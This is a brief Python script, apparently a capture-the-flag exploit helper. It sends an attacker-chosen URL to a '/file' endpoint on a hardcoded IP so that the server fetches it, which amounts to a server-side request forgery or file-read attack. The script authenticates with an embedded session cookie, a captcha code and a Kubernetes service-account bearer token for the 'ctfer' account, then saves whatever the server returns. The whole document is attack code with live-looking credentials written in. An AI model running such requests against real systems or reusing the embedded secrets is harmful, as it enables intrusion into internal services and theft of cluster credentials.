import requests
import sys

URL = "http://1.13.254.132:8080/"
COOKIE = {
    "JSESSIONID":"952253BD57C6EBF83ECA9AD8E7731879"
}
DATA = {
    "url": sys.argv[1],
    "Vcode": "UtV4",
}
HEADERS = {"Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1IN0RxS0k3U0xhZ1ljYnk1WkE3WE5Mb2dMcVdLOXh5NXVEdmtfc2lKMWMifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImN0ZmVyLXRva2VuLXB6NWxtIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImN0ZmVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiYjg2ODY0MTgtOWNiOC00MjZiLThkZmQtNTgxM2E1YTVmMTdiIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmZXIifQ.JWwKPAYDMYDmqq-jg9Mzmvil-wG33skSqWsS3_zjv1bLGTRMUvP73w_LsLu7ptRJ1iofTbHBrgRyn01sJ2wjG8f-LruNFWwPj0S6zcGnfYlaUfG70lZIA7otXgEb2pCBzdqrxH4n4PR2aAE5wG-p_uoBjwiShrX-ykfxwErJMnwvJ15OQ57Y87QlZllkaYnvXgg3853qQ5ww414dz4UZ1BL7jXlcCjwbivHMifxMvUAL6GJWY-yoA3hJJBMNz5sjgUz71MXs-0wWLczDk5cv4mbXrjE-mCden5er32ifjsWBx6H_1i5JX6lSt3BP7iUxBQVaqLhnBtYR5nQuFADMFg"}

r = requests.post(URL+"file", cookies=COOKIE, data=DATA, headers=HEADERS)

with open("tmp", "wb") as f:
    f.write(r.content)

print(r.text)